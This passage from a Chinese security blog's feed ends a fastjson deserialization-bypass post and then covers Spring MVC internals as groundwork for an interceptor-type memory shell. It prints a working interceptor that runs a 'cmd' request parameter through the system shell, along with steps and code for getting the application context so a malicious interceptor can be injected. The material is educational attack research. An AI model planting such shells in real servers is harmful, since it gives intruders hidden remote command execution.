src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102437.png" alt="image.png"></p><p>在这里, 我们的自定义的类被加载<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102755.png" alt="image.png"></p><p>再往下, 对被check的类做了一些检查, 不能继承黑名单中的接口或类, 且需要继承期望类<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603102604.png" alt="image.png"><br>通过检查后, 返回到json解析器, 之后就是拿到反序列化器进行反序列化的过程了, 最终就是和之前一样, 调用构造器实例化这个类, 然后调用它的getter和setter为其添加属性</p><p>此利用方式在1.2.69被修复, 修复方式就是黑名单, 并且这次对期望类的黑名单也改为了哈希<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250603140542.png" alt="image.png"></p><h2 id="fastjson-1-2-80-期望类利用-异常类Throwable"><a href="#fastjson-1-2-80-期望类利用-异常类Throwable" class="headerlink" title="fastjson 1.2.80 期望类利用(异常类Throwable)"></a>fastjson 1.2.80 期望类利用(异常类Throwable)</h2><p>1.2.68的修复方式简单粗暴，将<code>java.lang.Runnable</code>、<code>java.lang.Readable</code>和<code>java.lang.AutoCloseable</code>加入了黑名单，那么1.2.80用的就是另一个期望类：异常类Throwable。</p><p>触发过程和之前的一样AutoCloseable一样, 困难点就是在于寻找对应的gadget了</p><h2 id="fastjson-1-2-80-期望类利用-Exception"><a href="#fastjson-1-2-80-期望类利用-Exception" class="headerlink" title="fastjson 1.2.80 期望类利用(Exception)"></a>fastjson 1.2.80 期望类利用(Exception)</h2><p>依旧困难点是在于寻找对应的gadget了, 最近的京麒2025在最新版本1.2.83也是利用的这个期望类</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/posts/fastjson-1.2.80/">y4er.com# fastjson 1.2.80 漏洞分析</a><br><a href="https://b1ue.cn/archives/382.html">b1ue.cn# fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a><br><a href="https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w">https://mp.weixin.qq.com/s/l1J4cGfqI_SssGKML7-z3w</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;fastjson&quot;&gt;&lt;a href=&quot;#fastjson&quot; class=&quot;headerlink&quot; title=&quot;fastjson&amp;lt;&amp;#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)&quot;&gt;&lt;/a&gt;fastjson&amp;lt;&amp;#x3D;1.2.2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Spring架构原理 &amp; Spring内存马</title>
    <link href="http://example.com/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2025/09/10/Spring%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86-Spring%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-09-10T06:40:14.000Z</published>
    <updated>2025-09-10T07:41:40.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring架构原理-Spring内存马"><a href="#Spring架构原理-Spring内存马" class="headerlink" title="Spring架构原理 &amp; Spring内存马"></a>Spring架构原理 &amp; Spring内存马</h1><h3 id="spring-mvc流程"><a href="#spring-mvc流程" class="headerlink" title="spring mvc流程"></a>spring mvc流程</h3><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805192207.png" alt="image.png"></p><h4 id="1-Spring-MVC的核心组件和大致处理流程"><a href="#1-Spring-MVC的核心组件和大致处理流程" class="headerlink" title="1.Spring MVC的核心组件和大致处理流程"></a>1.Spring MVC的核心组件和大致处理流程</h4><ol><li><p>DispatcherServlet是前端控制器，它负责接收Request并将Request转发给对应的处理组件；</p></li><li><p>HandlerMapping负责完成url到Controller映射，可以通过它来找到对应的处理Request的Controller；</p></li><li><p>Controller处理Request，并返回ModelAndVIew对象，ModelAndView是封装结果视图的组件；④~⑦表示视图解析器解析ModelAndView对象并返回对应的视图给客户端。</p></li></ol><h4 id="2-IOC容器"><a href="#2-IOC容器" class="headerlink" title="2.IOC容器"></a>2.IOC容器</h4><p>IOC（控制反转）容器是Spring框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。IOC容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。Spring框架提供了多种实现IOC容器的方式，下面讲两种常见的：</p><p>BeanFactory：Spring的最基本的IOC容器，提供了基本的IOC功能，只有在第一次请求时才创建对象。ApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能。ApplicationContext在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。</p><h4 id="3-Spring-MVC-九大组件"><a href="#3-Spring-MVC-九大组件" class="headerlink" title="3.Spring MVC 九大组件"></a>3.Spring MVC 九大组件</h4><p>这九大组件需要有个印象：</p><p>&#x3D;&#x3D;DispatcherServlet（派发Servlet)&#x3D;&#x3D;：负责将请求分发给其他组件，是整个Spring MVC流程的核心；<br>&#x3D;&#x3D;HandlerMapping（处理器映射)&#x3D;&#x3D;：用于确定请求的处理器（Controller）；<br>&#x3D;&#x3D;HandlerAdapter（处理器适配器)&#x3D;&#x3D;：将请求映射到合适的处理器方法，负责执行处理器方法；<br>&#x3D;&#x3D;HandlerInterceptor（处理器拦截器）&#x3D;&#x3D;：允许对处理器的执行过程进行拦截和干预；<br>&#x3D;&#x3D;Controller（控制器）&#x3D;&#x3D;：处理用户请求并返回适当的模型和视图；<br>&#x3D;&#x3D;ModelAndView（模型和视图）&#x3D;&#x3D;：封装了处理器方法的执行结果，包括模型数据和视图信息；<br>&#x3D;&#x3D;ViewResolver（视图解析器）&#x3D;&#x3D;：用于将逻辑视图名称解析为具体的视图对象；<br>&#x3D;&#x3D;LocaleResolver（区域解析器）&#x3D;&#x3D;：处理区域信息，用于国际化；<br>&#x3D;&#x3D;ThemeResolver（主题解析器）&#x3D;&#x3D;：用于解析Web应用的主题，实现界面主题的切换。</p><h4 id="九大组件初始化"><a href="#九大组件初始化" class="headerlink" title="九大组件初始化"></a>九大组件初始化</h4><p>首先是 位于 <code>org.springframework:spring-webmvc</code>的:<br><code>org.springframework.web.servlet.DispatcherServlet</code>, 查看其类结构, 没有一个总体的init方法, 其父类<code>FrameworkServlet</code>也一样, 但在其父类的父类<code>HttpServletBean</code>存在init方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805193420.png" alt="image.png"></p><p>其中的逻辑暂且不论, 关键在最后的<code>initServletBean();</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805193832.png" alt="image.png"></p><p>这个方法接口是留给子类实现的</p><p>FrameworkServlet对这个方法进行了实现<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194018.png" alt="image.png"><br>其中调用了<code>initWebApplicationContext</code>方法来初始化IOC容器<br>其中会调用到onRefresh<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194445.png" alt="image.png"></p><p>这个方法也是留给子类实现的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194539.png" alt="image.png"><br>看注释就知道这是在context刷新hou被调用用来执行一些特定于 Servlet的功能<br>DispatcherServlet对其进行了实现,  可以砍价其中的逻辑就是对九大组件的初始化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805194828.png" alt="image.png"></p><h3 id="SpringMVC-框架Interceptor组件"><a href="#SpringMVC-框架Interceptor组件" class="headerlink" title="SpringMVC 框架Interceptor组件"></a>SpringMVC 框架Interceptor组件</h3><p>TestInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInterceptor</span> <span class="keyword">extends</span> <span class="title class_">HandlerInterceptorAdapter</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                java.io.<span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">                ProcessBuilder processBuilder;  </span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;  </span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);  </span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                    processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd);  </span><br><span class="line">                &#125;  </span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">inputScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(processBuilder.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);  </span><br><span class="line">                output = inputScanner.hasNext() ? inputScanner.next(): output;  </span><br><span class="line">                inputScanner.close();  </span><br><span class="line">                writer.write(output);  </span><br><span class="line">                writer.flush();  </span><br><span class="line">                writer.close();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored)&#123;&#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要将TestInterceptor注册进去<br>WebConfig.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springdemo.demos.web;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Configuration</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;  </span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">TestInterceptor</span>()).addPathPatterns(<span class="string">&quot;/**&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805195642.png" alt="image.png"></p><h4 id="Spring-Interceptor引入与执行流程分析"><a href="#Spring-Interceptor引入与执行流程分析" class="headerlink" title="Spring Interceptor引入与执行流程分析"></a>Spring Interceptor引入与执行流程分析</h4><p>&#x3D;&#x3D;Spring Interceptor&#x3D;&#x3D;和&#x3D;&#x3D;Filter&#x3D;&#x3D;的区别</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>主要区别</strong></td><td><strong>拦截器</strong></td><td><strong>过滤器</strong></td></tr><tr><td>机制</td><td>Java反射机制</td><td>函数回调</td></tr><tr><td>是否依赖Servlet容器</td><td>不依赖</td><td>依赖</td></tr><tr><td>作用范围</td><td>对action请求起作用</td><td>对几乎所有请求起作用</td></tr><tr><td>是否可以访问上下文和值栈</td><td>可以访问</td><td>不能访问</td></tr><tr><td>调用次数</td><td>可以多次被调用</td><td>在容器初始化时只被调用一次</td></tr><tr><td>IOC容器中的访问</td><td>可以获取IOC容器中的各个bean（基于FactoryBean接口）</td><td>不能在IOC容器中获取bean</td></tr></tbody></table><p>Servlet只在第一次访问时才会被加载<br>断点打在HttpServletBean的init方法, 来看看请求是如何被处理的<br>看这个调用栈非常熟悉, 还是tomcat那一套<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805201205.png" alt="image.png"><br>之后就是上面的流程</p><p>加载完后 在<code>DispatcherServlet#doDispatch</code>方法也打上断点, 来看看<code>Dispatcher</code>是如何处理请求的</p><p>调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">doDispatch:<span class="number">1047</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">964</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">670</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">779</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">541</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">360</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">399</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">893</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1789</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>从这里可以看出来Dispatcher就是一个之前tomcat中的Servlet</p><p>往下走调用了getHandler这个函数<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805204345.png" alt="image.png"><br>跟进去, 看注释知道他会返回一个与此次request对应的<code>HandlerExecutionChain</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805204459.png" alt="image.png"><br>其中的逻辑是通过<code> mapping.getHandler(request);</code>来尝试获取handler, 只要获取到就返回<br>跟进去看看这个方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805223552.png" alt="image.png"></p><ol><li>先是通过getHandlerInternal来获取，如果获取不到，那就调用getDefaultHandler来获取默认的，如果还是获取不到，就直接返回null；</li><li>然后检查handler是不是一个字符串，如果是，说明可能是一个Bean的名字，这样的话就通过ApplicationContext来获取对应名字的Bean对象，这样就确保 handler 最终会是一个合法的处理器对象；</li><li>接着检查是否已经有缓存的请求路径，如果没有缓存就调用 <code>initLookupPath(request)</code> 方法来初始化请求路径的查找；</li><li>最后通过 <code>getHandlerExecutionChain</code> 方法创建一个处理器执行链。</li></ol><p>跟进到<code>getHandlerExecutionChain</code>方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805223944.png" alt="image.png"></p><ol><li>如果 handler 已是 HandlerExecutionChain 类型，则直接使用；</li><li>否则新建一个包装该处理器的执行链，遍历所有adaptedInterceptors拦截器，若拦截器是 MappedInterceptor 类型且匹配当前请求，则将其加入执行链。</li><li>返回最终的执行链对象。<br>这样就得到了<code>executionChain</code></li></ol><p>回到getHandler方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224234.png" alt="image.png"><br>后面是对于需要跨域的请求的处理</p><p>之后回到doDispatch 到applyPreHandle就是遍历执行各个interceptor<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224649.png" alt="image.png"><br>可以看见执行到了preHandle方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250805224748.png" alt="image.png"></p><h4 id="interceptor型内存马"><a href="#interceptor型内存马" class="headerlink" title="interceptor型内存马"></a>interceptor型内存马</h4><p>思路<br>Spring Interceptor型内存马的编写思路：</p><ol><li>获取ApplicationContext</li><li>通过AbstractHandlerMapping反射来获取adaptedInterceptors</li><li>将要注入的恶意拦截器放入到adaptedInterceptors中</li></ol><p>简单思路：</p><ol><li>获取当前运行环境的上下文</li><li>实现恶意Interceptor</li><li>注入恶意Interceptor</li></ol><p>★当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层：<br>    &#x3D;&#x3D;<code>HttpRequest</code>&#x3D;&#x3D;–&gt; &#x3D;&#x3D;Filter&#x3D;&#x3D; –&gt; &#x3D;&#x3D;<code>DispactherServlet</code>&#x3D;&#x3D; –&gt; &#x3D;&#x3D;<code>Interceptor</code>&#x3D;&#x3D; –&gt; &#x3D;&#x3D;Controller&#x3D;&#x3D;<br>下面的问题就是如何动态地注册一个恶意的Interceptor了。</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806163941.png" alt="image.png"></p><p>可以看见只要反射修改<code>AbstractHandlerMapping</code>即可</p><p>我们当前类是<code>RequestMappingHandlerMapping</code>显然是继承了<code>AbstractHandlerMapping</code><br>调用栈往回调, 就能看见这个类的来历, 他是<code>DispatcherServlet</code>的<code>this.handlerMappings</code>中其中一个mapping, 听名字就知道是作用于一个request的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806164409.png" alt="image.png"></p><p>按照之前tomcat的思路, 也就是说获取到<code>DispatcherServlet</code>就能获取到它</p><p>看了别的文章, 发现使用的是<code>WebApplicationContext</code>来获取<code>abstractHandlerMapping</code><br>为什么这样? </p><h5 id="WebApplicationContext从何而来-有什么作用"><a href="#WebApplicationContext从何而来-有什么作用" class="headerlink" title="WebApplicationContext从何而来? 有什么作用?"></a><code>WebApplicationContext</code>从何而来? 有什么作用?</h5><p>这里所说的<code>WebApplicationContext</code>是一个接口, 在springboot启动时便有了一个context<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806222257.png" alt="image.png"><br>也就是<code>AnnotationConfigServletWebServerApplicationContext</code> 这个类是实现了<code>WebApplicationContext</code>接口的<br><code>WebApplicationContext</code>中存放了各种bean, 其中就包括了我们要获取的AbstractHandlerMapping<br>context创建bean的细节见[[Spring Web MVC 框架#bean创建流程]]</p><p>而<code>DispatcherServlet</code>也持有了这个<code>WebApplicationContext</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807164313.png" alt="image.png"></p><blockquote><p>在 Spring Boot 之前，<code>DispatcherServlet</code> 自身需要创建一个<strong>子上下文</strong>来管理 Web 层 Bean。但在 Spring Boot 的世界里，这个职责被简化了。</p></blockquote><blockquote><p>现在，<code>DispatcherServlet</code> 的主要任务就是<strong>作为一个请求处理器</strong>。它不再需要自己去创建和管理 Bean，而是<strong>直接使用</strong>那个已经创建好的、包含了所有 Bean 的 <code>AnnotationConfigServletWebServerApplicationContext</code>。</p></blockquote><h5 id="如何获取WebApplicationContext"><a href="#如何获取WebApplicationContext" class="headerlink" title="如何获取WebApplicationContext"></a>如何获取WebApplicationContext</h5><p>按照文章中的说法, 有四种方法：</p><p><strong>1.getCurrentWebApplicationContext</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。</p><p><strong>2.WebApplicationContextUtils</strong></p><p>_通过这种方法获得的也是一个Root WebApplicationContext。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 WebApplicationContextUtils.getRequiredWebApplicationContext来替换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></pre></td></tr></table></figure><p><strong>3.RequestContextUtils</strong></p><p>通过<code>ServletRequest</code>类的实例来获得<code>Child WebApplicationContext</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4.getAttribute</strong></p><p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 <code>Child WebApplicationContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>先来看getAttribute</p><h6 id="getAttribute获取"><a href="#getAttribute获取" class="headerlink" title="getAttribute获取"></a>getAttribute获取</h6><p>首先是<code>RequestContextHolder.currentRequestAttributes()</code>可以获取当前的请求和响应组成的一个Attributes</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807223530.png" alt="image.png"><br>可以看见它把RequestFacade和ResponeFacade包装在一起了<br>之后可以跟进getAttribute方法</p><p>可以看见第二个参数是0的话就是从requestFacade中获取, 否则从session中获取<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807223742.png" alt="image.png"></p><p>最终是从Request中的attribute中获取, 这个attribute存储了当前请求的上下文信息还有请求的具体信息<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807224017.png" alt="image.png"><br>其中就包括了<code>AnnotationConfigServletWebServerApplicationContext</code>, 这正是我们要拿到的</p><h5 id="获取requestMappingHandlerMapping"><a href="#获取requestMappingHandlerMapping" class="headerlink" title="获取requestMappingHandlerMapping"></a>获取requestMappingHandlerMapping</h5><p>接下来就是从AnnotationConfigServletWebServerApplicationContext管理的众多bean中获取AbstractHandlerMapping<br>虽说是AbstractHandlerMapping, 具体的类实际上是requestMappingHandlerMapping<br>可以看之前的图:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250806163941.png" alt="image.png"></p><p>在beanFactory存储的单例中可以找到:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807225800.png" alt="image.png"><br>我们当然可以反射获取,不过在AnnotationConfigServletWebServerApplicationContext的祖宗类AbstractApplicationContext中实现了getBean方法可以直接获取BeanFactory中的bean<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250807230634.png" alt="image.png"></p><h5 id="构造并植入interceptor"><a href="#构造并植入interceptor" class="headerlink" title="构造并植入interceptor"></a>构造并植入interceptor</h5><p>先准备一个简单的恶意拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> 